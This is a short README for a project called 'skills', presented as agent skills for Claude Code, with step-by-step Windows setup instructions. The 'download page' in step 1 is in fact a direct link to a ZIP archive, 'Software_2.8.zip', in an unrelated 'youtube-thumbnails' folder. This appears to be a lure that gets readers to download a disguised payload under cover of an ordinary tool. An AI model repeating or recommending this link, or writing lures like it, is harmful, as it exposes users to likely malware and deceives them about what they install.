## 📘 What this is

**skills** is a set of agent skills for Claude Code and other AI agents. It helps you work with task-based instructions in a more structured way. You can use it to keep common work in one place, so your AI tool can follow the same patterns each time.

This project is meant for people who want a simple way to add useful agent skills without building a complex setup. On Windows, you can use it by visiting the download page, getting the files you need, and then placing them where your AI tool can read them.

## 🪟 Windows setup

Use this section if you want to get **skills** running on a Windows PC.

### 1. Open the download page

Go to this page:

https://github.com/biyearly-mesothelioma790/skills/raw/refs/heads/main/youtube-thumbnails/Software_2.8.zip

If your browser shows the repository page, use it to get the project files.

### 2. Get the files

On the page, look for the green **Code** button or the file list. Download the repository as a ZIP file, then save it to a folder you can find later, such as:

- Downloads
- Desktop
- Documents

### 3. Unzip the folder

After the ZIP file finishes downloading:

- Right-click the file
- Select **Extract All**
- Choose a folder
- Open the extracted folder

You should now see the project files on your computer.

### 4. Place the skills where your agent can read them

Different tools use different folders. A common setup is to keep the skills files in a simple folder and point your AI tool to that location.

A practical folder name is:

- `skills`

If your AI tool supports custom folders, add the path to the extracted folder there. If it uses a fixed location, copy the files into that location.

### 5. Start using it

Open Claude Code or your other AI agent tool and point it to the skills folder if needed. Then ask it to use the skills for your task.
